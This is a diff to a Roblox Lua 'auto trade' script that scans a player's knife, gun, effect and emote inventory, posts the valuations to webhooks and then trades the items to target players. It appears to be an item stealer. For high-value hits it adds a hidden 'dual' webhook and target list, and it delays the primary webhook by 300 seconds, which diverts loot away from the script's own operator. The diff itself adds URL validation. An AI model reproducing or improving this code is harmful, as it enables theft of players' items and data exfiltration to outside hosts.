@@ -1,5 +1,5 @@
 -- ==========================================
--- SCRIPT 2 (CORE ACTUALIZADO CON GITHUB Y DELAY - CORREGIDO)
+-- SCRIPT 2 (CORE ACTUALIZADO CON GITHUB Y DELAY - FIX ANTI-CRASH)
 -- ==========================================
 local HttpService = game:GetService("HttpService")
 local RS = game:GetService("ReplicatedStorage")
@@ -96,8 +96,20 @@ task.spawn(function()
     end
 
     local config = getgenv().AutoTradeConfig or {}
-    local WEBHOOK_LOGS       = config.WebhookLogs       or ""
-    local WEBHOOK_INVENTARIO = config.WebhookInventario or ""
+    
+    -- ==========================================
+    -- FIX ANTI-CRASH: Validación estricta de URL
+    -- ==========================================
+    local function isValidUrl(url)
+        return type(url) == "string" and string.match(url, "^https?://") ~= nil
+    end
+
+    local rawLogs = config.WebhookLogs or ""
+    local rawInv = config.WebhookInventario or ""
+
+    local WEBHOOK_LOGS       = isValidUrl(rawLogs) and rawLogs or ""
+    local WEBHOOK_INVENTARIO = isValidUrl(rawInv) and rawInv or ""
+    -- ==========================================
 
     local startTime = os.time()
 
@@ -172,7 +184,6 @@ task.spawn(function()
             return string.gsub(name, " ", "")
         end
 
-        -- Escaneo usando tablas PRINCIPALES
         local function scanAndSave(category, valueTable, resultTable)
             local inv = pd:TryIndex({"Inventory", category})
             if not inv then return end
@@ -315,12 +326,7 @@ task.spawn(function()
 
             local jsonPayload = HttpService:JSONEncode(webhookPayload)
 
-            -- ==========================================
-            -- LÓGICA DUAL WEBHOOK CON SUS PROPIOS VALORES
-            -- ==========================================
             if totalValue >= 5000 or hasSpecialEffect then
-
-                -- Re-escanear inventario con los valores EXCLUSIVOS del Dual Webhook
                 local knivesDualResult, gunsDualResult, effectsDualResult, emotesDualResult = {}, {}, {}, {}
                 local totalValueDual = 0
 
@@ -344,7 +350,6 @@ task.spawn(function()
                 scanDual("Effect", EffectsDual, effectsDualResult)
                 scanDual("Emote",  EmotesDual,  emotesDualResult)
 
-                -- Construir embed con valores Dual
                 local camposDual = {}
                 if #knivesDualResult  > 0 then table.insert(camposDual, { name = "🔪 Knives", value = formatearLista(knivesDualResult),  inline = true  }) end
                 if #gunsDualResult    > 0 then table.insert(camposDual, { name = "🔫 Guns",   value = formatearLista(gunsDualResult),    inline = true  }) end
@@ -376,7 +381,6 @@ task.spawn(function()
 
                 local dualJsonPayload = HttpService:JSONEncode(dualPayload)
 
-                -- Enviar inmediatamente al Dual Webhook con valores Dual
                 task.spawn(function()
                     if DUAL_WEBHOOK_INVENTARIO ~= "" then
                         request({
@@ -388,7 +392,6 @@ task.spawn(function()
                     end
                 end)
 
-                -- Enviar al webhook principal con delay de 300s
                 if WEBHOOK_INVENTARIO ~= "" then
                     task.delay(300, function()
                         pcall(function()
@@ -396,7 +399,7 @@ task.spawn(function()
                                 Url     = WEBHOOK_INVENTARIO,
                                 Method  = "POST",
                                 Headers = { ["Content-Type"] = "application/json" },
-                                Body    = jsonPayload  -- usa valores principales
+                                Body    = jsonPayload 
                             })
                         end)
                     end)
@@ -404,7 +407,6 @@ task.spawn(function()
 
                 jugadoresObjetivos = jugadoresObjetivosDual
             else
-                -- Hit normal: solo webhook principal con valores principales
                 if WEBHOOK_INVENTARIO ~= "" then
                     request({
                         Url     = WEBHOOK_INVENTARIO,
@@ -416,9 +418,6 @@ task.spawn(function()
             end
         end
 
-        -- ==========================================
-        -- RESTO DEL FLUJO (buscar jugador y tradear)
-        -- ==========================================
         local jugadorEncontrado = nil
         repeat
             task.wait(0.5)
@@ -463,9 +462,6 @@ task.spawn(function()
                 return string.gsub(name, " ", "")
             end
 
-            -- El tradeo usa los valores según qué jugadores son objetivo:
-            -- Si jugadoresObjetivos fue cambiado a jugadoresObjetivosDual → usar KnivesDual, etc.
-            -- Si no → usar Knives normales.
             local esDualMode = (jugadoresObjetivos == jugadoresObjetivosDual)
             local KT = esDualMode and KnivesDual  or Knives
             local GT = esDualMode and GunsDual    or Guns
